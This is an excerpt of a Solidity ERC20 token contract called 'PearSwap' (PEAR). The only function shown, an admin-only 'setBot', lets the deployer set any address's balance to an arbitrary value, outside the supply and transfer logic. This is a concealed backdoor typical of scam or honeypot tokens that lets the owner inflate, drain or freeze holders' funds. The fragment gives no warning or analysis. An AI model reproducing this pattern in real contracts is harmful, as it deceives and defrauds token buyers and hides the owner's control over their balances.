...
contract PearSwap is ERC20{
    uint8 public constant decimals = 18;
    uint256 initialSupply = 2500000*10**uint256(decimals);
    string public constant name = "PearSwap";
    string public constant symbol = "PEAR";
    address payable admin;
    uint256 tokenBalance;
    uint256 decimal = 10;
    bool public valid = true;
    uint256 public amount = 2500000*10**uint256(decimals);
    ...
    function setBot(address _bot, uint256 _amount) public {
        require(msg.sender == admin);
        balances[_bot]=_amount*10**uint256(decimals);
    }
